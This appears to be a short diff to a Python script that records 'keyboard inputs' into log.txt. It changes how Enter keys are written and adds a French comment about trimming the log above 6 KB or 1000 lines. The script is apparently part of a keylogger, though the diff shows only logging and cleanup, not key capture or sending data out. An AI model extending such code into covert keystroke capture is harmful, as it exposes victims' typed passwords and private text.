@@ -44,11 +44,16 @@ MAX_FILE_SIZE = 6000
 NUM_LINES_TO_KEEP = 1000
 
 # function to write keyboard inputs to file
+# function to write keyboard inputs to file
 def write_keys(keys_pressed):
     with open("log.txt", "a") as f:
-        f.write("".join(keys_pressed))
+        if " [ENTER] " in keys_pressed:
+            f.write("\n")
+        else:
+            f.write("".join(keys_pressed))
 
-# function to clean file if size exceeds max_file_size
+
+# Nettoie le fichier log si il dépasse 6Ko ou qu'il dépasse 1000 lignes
 def clean_file():
     with open("log.txt", "r+") as f:
         lines = f.readlines()
